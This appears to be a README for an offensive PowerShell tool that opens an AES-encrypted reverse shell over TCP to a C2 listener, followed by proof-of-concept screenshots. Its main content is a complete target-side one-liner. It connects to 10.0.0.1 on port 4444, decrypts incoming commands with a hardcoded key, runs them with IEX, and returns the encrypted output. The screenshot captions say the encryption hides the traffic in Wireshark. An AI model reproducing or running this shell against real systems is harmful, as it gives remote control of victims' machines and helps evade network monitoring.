
### Reverse Encrypted (AES 256-bit) Shell over TCP using PowerShell SecureString. ###

- Attacker (C2-Server Listener):

PS> .\Server.ps1

- Target (Client):

PS> $Key=(226,183,97,6,17,176,21,164,211,64,197,229,220,92,207,182,192,132,103,202,131,244,142,31,82,141,162,94,187,176,23,192);$Client=New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$Stream=$Client.GetStream();[byte[]]$Bytes=0..65535|%{0};while(($Read=$Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0){;$Command=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $Read);$DeCode=$Command | ConvertTo-SecureString -Key $Key;$OutPut=(IEX([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($DeCode))) 2>&1 | Out-String);$EnCode=ConvertTo-SecureString $OutPut -AsPlainText -Force | ConvertFrom-SecureString -Key $Key;$SendByte=([text.encoding]::ASCII).GetBytes($EnCode);$Stream.Write($SendByte,0,$SendByte.Length);$Stream.Flush()};$Client.Close();Exit

### PoC: ###

- Reverse Encrypted (AES 256-bit) Shell over TCP, PowerShell Execution (C2-Server Listener & Client):

![alt text](/PoC1.jpg)

- Reverse Encrypted (AES 256-bit) Shell over TCP, Encrypted Traffic (WireShark):

![alt text](/PoC2.jpg)
